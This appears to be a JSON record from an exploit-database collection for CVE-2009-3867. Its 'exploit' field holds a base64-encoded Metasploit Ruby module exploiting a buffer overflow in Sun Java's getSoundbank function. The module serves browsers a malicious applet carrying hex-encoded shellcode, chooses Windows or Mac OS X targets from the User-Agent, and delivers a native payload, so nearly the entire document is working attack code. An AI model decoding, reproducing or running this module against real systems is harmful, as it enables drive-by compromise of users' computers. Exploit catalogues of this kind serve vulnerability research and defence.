{
    "source": "exploit-database", 
    "exploit": "IyMNCiMgJElkOiBqYXZhX2dldHNvdW5kYmFua19ib2YucmIgMTAzOTQgMjAxMC0wOS0yMCAwODowNjoyN1ogamR1Y2sgJA0KIyMNCg0KIyMNCiMgVGhpcyBmaWxlIGlzIHBhcnQgb2YgdGhlIE1ldGFzcGxvaXQgRnJhbWV3b3JrIGFuZCBtYXkgYmUgc3ViamVjdCB0bw0KIyByZWRpc3RyaWJ1dGlvbiBhbmQgY29tbWVyY2lhbCByZXN0cmljdGlvbnMuIFBsZWFzZSBzZWUgdGhlIE1ldGFzcGxvaXQNCiMgRnJhbWV3b3JrIHdlYiBzaXRlIGZvciBtb3JlIGluZm9ybWF0aW9uIG9uIGxpY2Vuc2luZyBhbmQgdGVybXMgb2YgdXNlLg0KIyBodHRwOi8vbWV0YXNwbG9pdC5jb20vZnJhbWV3b3JrLw0KIyMNCg0KDQpyZXF1aXJlICdtc2YvY29yZScNCg0KDQpjbGFzcyBNZXRhc3Bsb2l0MyA8IE1zZjo6RXhwbG9pdDo6UmVtb3RlDQoJUmFuayA9IEdyZWF0UmFua2luZw0KDQoJIw0KCSMgVGhpcyBtb2R1bGUgYWN0cyBhcyBhbiBIVFRQIHNlcnZlcg0KCSMNCglpbmNsdWRlIE1zZjo6RXhwbG9pdDo6UmVtb3RlOjpIdHRwU2VydmVyOjpIVE1MDQoNCglkZWYgaW5pdGlhbGl6ZShpbmZvID0ge30pDQoJCXN1cGVyKHVwZGF0ZV9pbmZvKGluZm8sDQoJCQknTmFtZScgICAgICAgICAgID0+ICdTdW4gSmF2YSBKUkUgZ2V0U291bmRiYW5rIGZpbGU6Ly8gVVJJIEJ1ZmZlciBPdmVyZmxvdycsDQoJCQknRGVzY3JpcHRpb24nICAgID0+ICVxew0KCQkJCVRoaXMgbW9kdWxlIGV4cGxvaXRzIGEgZmxhdyBpbiB0aGUgZ2V0U291bmRiYW5rIGZ1bmN0aW9uIGluIHRoZSBTdW4gSlZNLg0KDQoJCQkJVGhlIHBheWxvYWQgaXMgc2VyaWFsaXplZCBhbmQgcGFzc2VkIHRvIHRoZSBhcHBsZXQgdmlhIFBBUkFNIHRhZ3MuIEl0IG11c3QgYmUNCgkJCQlhIG5hdGl2ZSBwYXlsb2FkLg0KDQoJCQkJVGhlIGVmZmVjdGVkIEphdmEgdmVyc2lvbnMgYXJlIEpESyBhbmQgSlJFIDYgVXBkYXRlIDE2IGFuZCBlYXJsaWVyLA0KCQkJCUpESyBhbmQgSlJFIDUuMCBVcGRhdGUgMjEgYW5kIGVhcmxpZXIsIFNESyBhbmQgSlJFIDEuNC4yXzIzIGFuZA0KCQkJCWVhcmxpZXIsIGFuZCBTREsgYW5kIEpSRSAxLjMuMV8yNiBhbmQgZWFybGllci4NCg0KCQkJCU5PVEU6IEFsdGhvdWdoIGFsbCBvZiB0aGUgYWJvdmUgdmVyc2lvbnMgYXJlIHJlcG9ydGVkbHkgdnVsbmVyYWJsZSwgb25seQ0KCQkJCTEuNi4wX3UxMSBhbmQgMS42LjBfdTE2IG9uIFdpbmRvd3MgWFAgU1AzIHdlcmUgdGVzdGVkLg0KCQkJfSwNCgkJCSdMaWNlbnNlJyAgICAgICAgPT4gTVNGX0xJQ0VOU0UsDQoJCQknQXV0aG9yJyAgICAgICAgID0+DQoJCQkJWw0KCQkJCQkna2YnLCAgICAgICMgT3JpZ2luYWwgUG9DL2V4cGxvaXQNCgkJCQkJJ2pkdWNrJyAgICAjIG1ldGFzcGxvaXQgdmVyc2lvbg0KCQkJCV0sDQoJCQknVmVyc2lvbicgICAgICAgID0+ICckUmV2aXNpb246IDEwMzk0ICQnLA0KCQkJJ1JlZmVyZW5jZXMnICAgICA9Pg0KCQkJCVsNCgkJCQkJWyAnQ1ZFJywgJzIwMDktMzg2NycgXSwNCgkJCQkJWyAnT1NWREInLCAnNTk3MTEnIF0sDQoJCQkJCVsgJ0JJRCcsICczNjg4MScgXSwNCgkJCQkJWyAnVVJMJywgJ2h0dHA6Ly96ZXJvZGF5aW5pdGlhdGl2ZS5jb20vYWR2aXNvcmllcy9aREktMDktMDc2LycgXQ0KCQkJCV0sDQoJCQknUGF5bG9hZCcgICAgICAgID0+DQoJCQkJew0KCQkJCQknU3BhY2UnICAgID0+IDEwMjQsDQoJCQkJCSdCYWRDaGFycycgPT4gJycsDQoJCQkJCSdEaXNhYmxlTm9wcycgPT4gdHJ1ZSwNCgkJCQl9LA0KCQkJJ1RhcmdldHMnICAgICAgICA9Pg0KCQkJCVsNCj1iZWdpbg0KDQpObyBhdXRvbWF0aWMgdGFyZ2V0dGluZyBmb3Igbm93IC4uLg0KDQoJCQkJCVsgJ0oyU0UgMS42XzE2IEF1dG9tYXRpYycsDQoJCQkJCQl7DQoJCQkJCQkJJ1BsYXRmb3JtJyA9PiBbJ3dpbicsICdsaW51eCcsICdvc3gnXSwNCgkJCQkJCQknQXJjaCcgPT4gW0FSQ0hfWDg2LCBBUkNIX1BQQ10NCgkJCQkJCX0NCgkJCQkJXSwNCj1lbmQNCgkJCQkJWyAnSjJTRSAxLjZfMTYgb24gV2luZG93cyB4ODYnLA0KCQkJCQkJew0KCQkJCQkJCSdQbGF0Zm9ybScgPT4gJ3dpbicsDQoJCQkJCQkJJ0FyY2gnID0+IEFSQ0hfWDg2DQoJCQkJCQl9DQoJCQkJCV0sDQoJCQkJCVsgJ0oyU0UgMS42XzE2IG9uIE1hYyBPUyBYIFBQQycsDQoJCQkJCQl7DQoJCQkJCQkJJ1BsYXRmb3JtJyA9PiAnb3N4JywNCgkJCQkJCQknQXJjaCcgPT4gQVJDSF9QUEMsDQoJCQkJCQl9DQoJCQkJCV0sDQoJCQkJCVsgJ0oyU0UgMS42XzE2IG9uIE1hYyBPUyBYIHg4NicsDQoJCQkJCQl7DQoJCQkJCQkJJ1BsYXRmb3JtJyA9PiAnb3N4JywNCgkJCQkJCQknQXJjaCcgPT4gQVJDSF9YODYsDQoJCQkJCQl9DQoJCQkJCV0sDQoJCQkJXSwNCgkJCSdEZWZhdWx0VGFyZ2V0JyAgPT4gMCwNCgkJCSdEaXNjbG9zdXJlRGF0ZScgPT4gJ05vdiAwNCAyMDA5Jw0KCQkJKSkNCgllbmQNCg0KDQoJZGVmIGV4cGxvaXQNCgkJIyBsb2FkIHRoZSBzdGF0aWMgamFyDQoJCXBhdGggPSBGaWxlLmpvaW4oTXNmOjpDb25maWcuaW5zdGFsbF9yb290LCAiZGF0YSIsICJleHBsb2l0cyIsICJDVkUtMjAwOS0zODY3LmphciIpDQoJCWZkID0gRmlsZS5vcGVuKHBhdGgsICJyYiIpDQoJCUBqYXJfZGF0YSA9IGZkLnJlYWQoZmQuc3RhdC5zaXplKQ0KCQlmZC5jbG9zZQ0KDQoJCXN1cGVyDQoJZW5kDQoNCg0KCWRlZiBvbl9yZXF1ZXN0X3VyaShjbGksIHJlcSkNCg0KCQkjIENyZWF0ZSBhIGNhY2hlZCBtYXBwaW5nIGJldHdlZW4gSVAgYW5kIGRldGVjdGVkIHRhcmdldA0KCQlAdGFyZ2V0Y2FjaGUgfHw9IHt9DQoJCUB0YXJnZXRjYWNoZVtjbGkucGVlcmhvc3RdIHx8PSB7fQ0KCQlAdGFyZ2V0Y2FjaGVbY2xpLnBlZXJob3N0XVs6dXBkYXRlXSA9IFRpbWUubm93LnRvX2kNCg0KCQlpZiAodGFyZ2V0Lm5hbWUgPX4gL0F1dG9tYXRpYy8pDQoJCQljYXNlIHJlcS5oZWFkZXJzWydVc2VyLUFnZW50J10NCgkJCXdoZW4gL1dpbmRvd3MvaQ0KCQkJCXByaW50X3N0YXR1cygiQ2hvb3NpbmcgYSBXaW5kb3dzIHRhcmdldCBmb3IgI3tjbGkucGVlcmhvc3R9OiN7Y2xpLnBlZXJwb3J0fS4uLiIpDQoJCQkJQHRhcmdldGNhY2hlW2NsaS5wZWVyaG9zdF1bOnRhcmdldF0gPSBzZWxmLnRhcmdldHNbMV0NCgkJCXdoZW4gL1BQQyBNYWMgT1MgWC9pDQoJCQkJcHJpbnRfc3RhdHVzKCJDaG9vc2luZyBhIE1hYyBPUyBYIFBQQyB0YXJnZXQgZm9yICN7Y2xpLnBlZXJob3N0fToje2NsaS5wZWVycG9ydH0uLi4iKQ0KCQkJCUB0YXJnZXRjYWNoZVtjbGkucGVlcmhvc3RdWzp0YXJnZXRdID0gc2VsZi50YXJnZXRzWzJdDQoJCQl3aGVuIC9JbnRlbCBNYWMgT1MgWC9pDQoJCQkJcHJpbnRfc3RhdHVzKCJDaG9vc2luZyBhIE1hYyBPUyBYIHg4NiB0YXJnZXQgZm9yICN7Y2xpLnBlZXJob3N0fToje2NsaS5wZWVycG9ydH0uLi4iKQ0KCQkJCUB0YXJnZXRjYWNoZVtjbGkucGVlcmhvc3RdWzp0YXJnZXRdID0gc2VsZi50YXJnZXRzWzNdDQoJCQllbHNlDQoJCQkJcHJpbnRfc3RhdHVzKCJVbmtub3duIHRhcmdldCBmb3I6ICN7cmVxLmhlYWRlcnNbJ1VzZXItQWdlbnQnXX0iKQ0KCQkJZW5kDQoJCWVuZA0KDQoJCSMgQ2xlYW4gdGhlIGNhY2hlDQoJCXJtcSA9IFtdDQoJCUB0YXJnZXRjYWNoZS5lYWNoX2tleSBkbyB8YWRkcnwNCgkJCWlmIChUaW1lLm5vdy50b19pID4gQHRhcmdldGNhY2hlW2FkZHJdWzp1cGRhdGVdKzYwKQ0KCQkJCXJtcS5wdXNoIGFkZHINCgkJCWVuZA0KCQllbmQNCg0KCQlybXEuZWFjaCB7fGFkZHJ8IEB0YXJnZXRjYWNoZS5kZWxldGUoYWRkcikgfQ0KDQoNCgkJIyBSZXF1ZXN0IHByb2Nlc3NpbmcNCgkJaWYgKG5vdCByZXEudXJpLm1hdGNoKC9cLmphciQvaSkpDQoNCgkJCSMgUmVkaXJlY3QgdG8gdGhlIGJhc2UgZGlyZWN0b3J5IHNvIHRoZSBhcHBsZXQgY29kZSBsb2Fkcy4uLg0KCQkJaWYgKG5vdCByZXEudXJpLm1hdGNoKC9cLyQvKSkNCgkJCQlwcmludF9zdGF0dXMoIlNlbmRpbmcgcmVkaXJlY3Qgc28gcGF0aCBlbmRzIHdpdGggLyAuLi4iKQ0KCQkJCXNlbmRfcmVkaXJlY3QoY2xpLCBnZXRfcmVzb3VyY2UoKSArICcvJywgJycpDQoJCQkJcmV0dXJuDQoJCQllbmQNCg0KCQkJIyBEaXNwbGF5IHRoZSBhcHBsZXQgbG9hZGluZyBIVE1MDQoJCQlwcmludF9zdGF0dXMoIlNlbmRpbmcgSFRNTCB0byAje2NsaS5wZWVyaG9zdH06I3tjbGkucGVlcnBvcnR9Li4uIikNCgkJCXNlbmRfcmVzcG9uc2VfaHRtbChjbGksIGdlbmVyYXRlX2h0bWwocGF5bG9hZC5lbmNvZGVkKSwNCgkJCQl7DQoJCQkJCSdDb250ZW50LVR5cGUnID0+ICd0ZXh0L2h0bWwnLA0KCQkJCQknUHJhZ21hJyA9PiAnbm8tY2FjaGUnDQoJCQkJfSkNCgkJCXJldHVybg0KCQllbmQNCg0KCQkjIFNlbmQgdGhlIGFjdHVhbCBhcHBsZXQgb3Zlcg0KCQlwcmludF9zdGF0dXMoIlNlbmRpbmcgYXBwbGV0IHRvICN7Y2xpLnBlZXJob3N0fToje2NsaS5wZWVycG9ydH0uLi4iKQ0KCQlzZW5kX3Jlc3BvbnNlKGNsaSwgZ2VuZXJhdGVfYXBwbGV0KGNsaSwgcmVxKSwNCgkJCXsNCgkJCQknQ29udGVudC1UeXBlJyA9PiAnYXBwbGljYXRpb24vb2N0ZXQtc3RyZWFtJywNCgkJCQknUHJhZ21hJyA9PiAnbm8tY2FjaGUnDQoJCQl9KQ0KDQoJCSMgSGFuZGxlIHRoZSBwYXlsb2FkDQoJCWhhbmRsZXIoY2xpKQ0KCWVuZA0KDQoNCglkZWYgZ2VuZXJhdGVfaHRtbChwbCkNCg0KCQlodG1sID0gPDwtRU9GDQo8aHRtbD4NCjxoZWFkPg0KPCEtLSA8bWV0YSBodHRwLWVxdWl2PXJlZnJlc2ggY29udGVudD0xMCAvPiAtLT4NCjwvaGVhZD4NCjxib2R5Pg0KPGFwcGxldCB3aWR0aD0nMTAwJScgaGVpZ2h0PScxMDAlJyBjb2RlPSdBcHBsZXRYJyBhcmNoaXZlPSdKQVJOQU1FJz4NCjxwYXJhbSBuYW1lPSdzYycgdmFsdWU9J1NDT0RFJyAvPg0KPHBhcmFtIG5hbWU9J25wJyB2YWx1ZT0nTk9QUycgLz4NCjwvYXBwbGV0Pg0KPC9ib2R5Pg0KPC9odG1sPg0KRU9GDQoNCgkJIyBmaW5hbGl6ZSB0aGUgaHRtbA0KCQlqYXJfbmFtZSA9IHJhbmRfdGV4dF9hbHBoYW51bWVyaWMoMzIpDQoJCWh0bWwuZ3N1YiEoL0pBUk5BTUUvLCBqYXJfbmFtZSkNCg0KCQkjIGFkZCBwYXlsb2FkDQoJCWRlYnVnX3BheWxvYWQgPSBmYWxzZQ0KCQlwbG9hZCA9ICIiDQoJCXBsb2FkIDw8ICJceGNjIiBpZiBkZWJ1Z19wYXlsb2FkDQoJCXBsb2FkIDw8IHBsDQoJCWlmICgocGxvYWQubGVuZ3RoICUgNCkgPiAwKQ0KCQkJcGxvYWQgPDwgcmFuZF90ZXh0KCg0IC0gKHBsb2FkLmxlbmd0aCAlIDQpKSkNCgkJZW5kDQoJCWlmIGRlYnVnX3BheWxvYWQNCgkJCXByaW50X3N0YXR1cygicGxvYWQgI3twbG9hZC5sZW5ndGh9IGJ5dGVzOlxuIiArIFJleDo6VGV4dC50b19oZXhfZHVtcChwbG9hZCkpDQoJCWVuZA0KCQlodG1sLmdzdWIhKC9TQ09ERS8sIFJleDo6VGV4dC50b19oZXgocGxvYWQsICcnKSkNCg0KCQkjIGFkZCBub3BzDQoJCW5vcHMgPSAiXHg5MFx4OTBceDkwXHg5MCINCgkJaHRtbC5nc3ViISgvTk9QUy8sIFJleDo6VGV4dC50b19oZXgobm9wcywgJycpKQ0KCQkjcHJpbnRfc3RhdHVzKCJub3BzICN7bm9wcy5sZW5ndGh9IGJ5dGVzOlxuIiArIFJleDo6VGV4dC50b19oZXhfZHVtcChub3BzKSkNCg0KCQlyZXR1cm4gaHRtbA0KDQoJZW5kDQoNCg0KCWRlZiBnZW5lcmF0ZV9hcHBsZXQoY2xpLCByZXEpDQoNCgkJdGhpc190YXJnZXQgPSBuaWwNCgkJaWYgKHRhcmdldC5uYW1lID1+IC9BdXRvbWF0aWMvKQ0KCQkJaWYgKEB0YXJnZXRjYWNoZVtjbGkucGVlcmhvc3RdWzp0YXJnZXRdKQ0KCQkJCXRoaXNfdGFyZ2V0ID0gQHRhcmdldGNhY2hlW2NsaS5wZWVyaG9zdF1bOnRhcmdldF0NCgkJCWVsc2UNCgkJCQlyZXR1cm4gJycNCgkJCWVuZA0KCQllbHNlDQoJCQl0aGlzX3RhcmdldCA9IHRhcmdldA0KCQllbmQNCg0KCQlyZXR1cm4gQGphcl9kYXRhDQoJZW5kDQoNCmVuZA==", 
    "filename": "platforms/multiple/remote/16294.rb", 
    "id": "16294", 
    "cves": [
        "CVE-2009-3867"
    ]
}